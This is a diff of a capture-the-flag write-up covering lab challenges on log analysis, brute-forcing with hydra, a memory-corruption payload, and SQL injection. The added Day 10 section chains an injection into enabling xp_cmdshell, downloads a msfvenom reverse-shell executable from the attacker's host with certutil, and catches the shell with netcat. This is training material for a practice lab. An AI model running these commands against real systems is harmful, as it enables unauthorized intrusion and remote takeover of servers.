@@ -1,6 +1,6 @@
 # Not including the days with copy paste solutions
 
-## Day 2
+## Day 2 (Log Analysis)
 
 ![image](https://github.com/michaelwang3668/ctf-writeups/assets/75542248/4c531c44-e8db-4bd0-9386-69eaf47d95a1)
 
@@ -8,12 +8,12 @@
 
 ![image](https://github.com/michaelwang3668/ctf-writeups/assets/75542248/df85fff5-553f-4b1f-ab72-42da868f0957)
 
-## Day 4
+## Day 4 (Brute-forcing)
 Instead of using their wfuzz wordlist, I tried writing my own payload with hydra:
 
 ``` hydra -L usernames.txt  -P passwords.txt 10.10.229.119 http-post-form "/login.php:username=^USER^&password=^PASS^:Please enter the correct credentials" -V -f ```
 
-## Day 6
+## Day 6 (Memory Corruption)
 
 Gold payload:
 ```AAAAAAAAAAAAXXXX```
@@ -27,7 +27,7 @@ The offset to the gold is 12 bytes, the offset to the inventory is 28 bytes. We 
 
 ![image](https://github.com/michaelwang3668/ctf-writeups/assets/75542248/681ab864-920c-4e48-af7b-90865cba8af2)
 
-## Day 7
+## Day 7 (Log Analysis)
 
 How many unique IP addresses are connected to the proxy server?
 
@@ -59,3 +59,50 @@ Having retrieved the exfiltrated data, what is the hidden flag?
 
 ``` cat access.log | grep frostlings.bigbadstash.thm | cut -d ' ' -f 5 | cut -d '=' -f2 | base64 -d ```
 
+## Day 10 (SQL Injection)
+
+Manually navigate the defaced website to find the vulnerable search form. What is the first webpage you come across that contains the gift-finding feature?
+
+``` /giftsearch.php ```
+
+Analyze the SQL error message that is returned. What ODBC Driver is being used in the back end of the website?
+
+``` http://10.10.199.212/giftresults.php?age=child%27&budget=0 ```
+
+![image](https://github.com/michaelwang3668/ctf-writeups/assets/75542248/384243d3-6f03-43ab-b9d2-102df635013f)
+
+Inject the 1=1 condition into the Gift Search form. What is the last result returned in the database?
+
+``` http://10.10.199.212/giftresults.php?age=%27%20or%201=1--&budget=0 ```
+
+![image](https://github.com/michaelwang3668/ctf-writeups/assets/75542248/ed5ff0ad-9844-477c-8dba-7eb3c645b4c1)
+
+Enabling xp_cmdshell:
+
+``` http://10.10.199.212/giftresults.php?age=%27;%20EXEC%20sp_configure%20%27show%20advanced%20options%27,%201;%20RECONFIGURE;%20EXEC%20sp_configure%20%27xp_cmdshell%27,%201;%20RECONFIGURE;%20-- ```
+
+Creating the reverse shell payload:
+
+``` msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.254.227 LPORT=1234 -f exe -o reverse.exe ```
+
+Hosting a webserver to get the payload onto target machine:
+
+``` python3 -m http.server 8000 ```
+
+Getting the payload onto target machine:
+
+``` http://10.10.199.212/giftresults.php?age=%27;%20EXEC%20xp_cmdshell%20%27certutil%20-urlcache%20-f%20http://10.10.254.227:8000/reverse.exe%20C:\Windows\Temp\reverse.exe%27;%20-- ```
+
+We get a hit:
+
+![image](https://github.com/michaelwang3668/ctf-writeups/assets/75542248/2c4cd87a-6a85-4089-8894-6ba1c12e0e06)
+
+Catching the reverse shell:
+
+``` nc -nvlp 1234 ```
+
+``` 10.10.199.212/giftresults.php?age='; EXEC xp_cmdshell 'C:\Windows\Temp\reverse.exe'; -- ```
+
+Get a hit:
+
+![image](https://github.com/michaelwang3668/ctf-writeups/assets/75542248/7ce1c230-088a-4e70-842c-92be43114f04)
